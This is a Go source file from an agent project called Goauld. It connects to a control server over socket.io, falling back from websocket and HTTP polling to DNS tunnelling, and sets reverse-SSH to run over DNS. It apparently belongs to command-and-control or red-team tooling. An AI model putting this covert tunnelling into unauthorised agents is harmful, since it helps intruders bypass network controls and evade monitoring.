package control

import (
	globalcontext "Goauld/agent/context"
	"Goauld/agent/proxy"
	"Goauld/agent/ssh/transport/blind"
	"Goauld/agent/ssh/transport/dns"
	"context"
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"Goauld/agent/config"
	"Goauld/common/log"

	socketio "Goauld/common/socket.io"

	"github.com/xtaci/smux"

	"github.com/coder/websocket"
	sio "github.com/hazegard/socket.io-go"
	eio "github.com/hazegard/socket.io-go/engine.io"
)

// NewControlPlanClient returns a new ControlPlanClient.
func NewControlPlanClient(ctx context.Context, configDone chan<- string, canceler *globalcontext.GlobalCanceler) *ControlPlanClient {
	return &ControlPlanClient{
		ctx:        ctx,
		url:        config.Get().SocketIoURL(config.Get().ID),
		configDone: configDone,
		canceler:   canceler,
	}
}

// InitStrategy is a struct holding the name of the transport as well
// as the function that will be used to initialize the socket.io connection.
type InitStrategy struct {
	Name     string
	InitFunc CpcStarter
}

// CpcStarter is a function that will be used to initialize the socket.io connection
// It returns an error if the connection failed.
type CpcStarter func(*ControlPlanClient, chan<- struct{}, chan<- error) error

// Init tries to connect to the control plan using the different strategies (CpcStarter)
// A successful connection will send a signal using the configDone channel.
func Init(ctx context.Context, globalCanceler *globalcontext.GlobalCanceler, configDone chan<- string, controlErr chan<- error, cpcStarter CpcStarter) (*ControlPlanClient, error) {
	ctx, cancel := context.WithCancel(ctx)
	controlPlanClient := NewControlPlanClient(ctx, configDone, globalCanceler)
	chanErr := make(chan error)
	chanSuccess := make(chan struct{})
	err := cpcStarter(controlPlanClient, chanSuccess, chanErr)
	if err != nil {
		cancel()

		return nil, err
	}
	// Start the control socket.io
	go func() {
		select {
		case controlErr <- controlPlanClient.Start():
		case <-ctx.Done():
		}
		cancel()
		controlPlanClient.Close()
	}()
	select {
	case e := <-chanErr:
		controlPlanClient.Close()
		cancel()

		return nil, e
	case <-chanSuccess:
		return controlPlanClient, nil
	}
}

// InitWs tries to connect to the control plan using the websocket transport.
func (cpc *ControlPlanClient) InitWs(success chan<- struct{}, chanErr chan<- error) error {
	cfg := getEioConfig([]string{"websocket"})

	return cpc.init(cfg, success, chanErr)
}

// InitWsUpgrade tries to connect to the control plan using the http to websocket upgrade transport.
func (cpc *ControlPlanClient) InitWsUpgrade(success chan<- struct{}, chanErr chan<- error) error {
	cfg := getEioConfig([]string{"polling", "websocket"})

	return cpc.init(cfg, success, chanErr)
}

// InitPolling tries to connect to the control plan using the HTTP long polling transport.
func (cpc *ControlPlanClient) InitPolling(success chan<- struct{}, chanErr chan<- error) error {
	cfg := getEioConfig([]string{"polling"})

	return cpc.init(cfg, success, chanErr)
}

// InitOverDNS tries to connect to the control plan using the DNS transport.
func (cpc *ControlPlanClient) InitOverDNS(session *smux.Stream, success chan<- struct{}, chanErr chan<- error) error {
	_, err := session.Write([]byte(config.Get().ID))
	// DNS MODE means we are using http to simplify the exchanges
	u := strings.TrimPrefix(strings.TrimPrefix(config.Get().SocketIoURL(config.Get().ID), "https://"), "http://")
	cpc.url = "http://" + u
	if err != nil {
		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
	}
	_, err = session.Write([]byte{'C'})
	if err != nil {
		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
	}
	cfg := getDNSEioConfig(session)

	return cpc.init(cfg, success, chanErr)
}

func (cpc *ControlPlanClient) InitControlOverDNSAlt(success chan<- struct{}, chanErr chan<- error) error {
	dnsServers := dns.GetDNSServers()
	if len(dnsServers) == 0 {
		return errors.New("no DNS servers found")
	}

	dnsClient, err := blind.NewDNSClient(config.Get().DNSServer(), config.Get().DNSDomainAlt(), "control", config.Get().ID)
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")

		return err
	}
	conn1, conn2 := net.Pipe()
	go dnsClient.Tunnel(conn2)
	log.Debug().Str("Mode", "DNSSH").Msg("Trying to mount SSH over the DNS connection")
	// Write S tag to inform the incoming SSH traffic
	// _, err = conn2.Write([]byte{'S'})
	// if err != nil {
	//	log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
	//
	//	return err
	//}

	err = cpc.InitOverDNSAlt(conn1, success, chanErr)
	if err != nil {
		return err
	}

	// As the  control socket is established using DNS we consider that the only working protocol is DNS
	// so we set the RSSH protocol order to only DNS
	config.Get().SetRSSHOrder([]string{"DNS-ALT"})

	return nil
}

// Init initializes the socket.io handlers.
func (cpc *ControlPlanClient) init(cfg *sio.ManagerConfig, success chan<- struct{}, chanErr chan<- error) error {
	manager := sio.NewManager(cpc.url, cfg)
	socket := manager.Socket("/", nil)

	socket.OnConnect(func() {
		log.Debug().Msg("OnConnect")
		log.Info().Msgf("Connected to the control server %s", cpc.url)
		success <- struct{}{}
	})
	socket.OnConnectError(func(err any) {
		log.Debug().Msg("OnConnectError")
		log.Error().Msgf("Error occurred connecting to %s (%v)", cpc.url, err)
		chanErr <- fmt.Errorf("error connecting to %s (%v)", cpc.url, err)
	})

	manager.OnError(func(err error) {
		log.Debug().Msg("OnError")
		log.Error().Err(err).Msgf("Error occurred  %s", cpc.url)
		cpc.ErrorPlusPlus()
	})
	manager.OnReconnect(func(attempt uint32) {
		cpc.canceler.Restart("Control socket disconnected")
		log.Debug().Msg("OnReconnect")
		log.Warn().Msgf("Reconnected to the control server %s, attempts N° %d", cpc.url, attempt)
	})

	AddHandlers(socket, cpc)

	cpc.socket = socket
	cpc.manager = manager

	return nil
}

// KeepAliveLoop starts a keepalive loop that will periodically send ping
//
// to keep alive the connection.
func (cpc *ControlPlanClient) keepAliveLoop(ctx context.Context) {
	cpc.socket.OnEvent(socketio.PongEvent.ID(), func(_ []byte) {
		log.Debug().Msg("OnEvent: PongEvent")
	})
	if config.Get().GetKeepalive() == 0 {
		return
	}
	//nolint:durationcheck
	t := time.NewTicker(config.Get().GetKeepalive() * time.Second)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			log.Trace().Msg("OnEvent: PingEvent")
			cpc.socket.Emit(socketio.PingEvent.ID())
		case <-ctx.Done():
			return
		}
	}
}

// ErrorPlusPlus handle when an error occurs on the socket.io side
// If more than 5 errors occur, the agent will automatically restart
// See to check the errors in a given time, reset the counter after some time.
func (cpc *ControlPlanClient) ErrorPlusPlus() {
	cpc.errorCounter++
	if cpc.errorCounter > 5 {
		log.Warn().Msgf("Error occurred %d times, restarting...", cpc.errorCounter)
		cpc.canceler.Restart(fmt.Sprintf("Control sockets crashed %d times", cpc.errorCounter))
		cpc.Close()
	}
}

// Close closes the socket.io connection.
func (cpc *ControlPlanClient) Close() {
	cpc.socket.Disconnect()
	cpc.socket.Emit(socketio.Disconnect.ID(), socketio.DisconnectMessage{})
	cpc.manager.Close()
}

// getEioConfig return the socket.io underlying configuration.
func getEioConfig(tr []string) *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			UpgradeDone: func(transportName string) {
				log.Trace().Str("Transport", transportName).Msg("Client transport upgrade done")
			},
			HTTPTransport: proxy.NewTransportProxy(),
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: proxy.NewHTTPClientProxy(nil),
				HTTPHeader: proxy.NewHeaderMap(),
			},
			Transports: tr,
		},
	}
}

// getEioConfig return the socket.io underlying configuration.
func getDNSEioConfig(session *smux.Stream) *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			UpgradeDone: func(transportName string) {
				log.Trace().Str("Transport", transportName).Msg("Client transport upgrade done")
			},
			HTTPTransport: NewSmuxTransport(session),
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: newSmuxHTTPandHTTPSClient(session),
			},
			// When tunneling over DNS, if we use polling only or polling then websocket upgrade,
			// The tunnel fails to establish properly as the server responds to unwanted content to the open HTTP socket.
			// Here we use the full duplex websocket mechanism to ensure that the tunnel is properly working
			// On the client side
			Transports: []string{"websocket"},
		},
	}
}
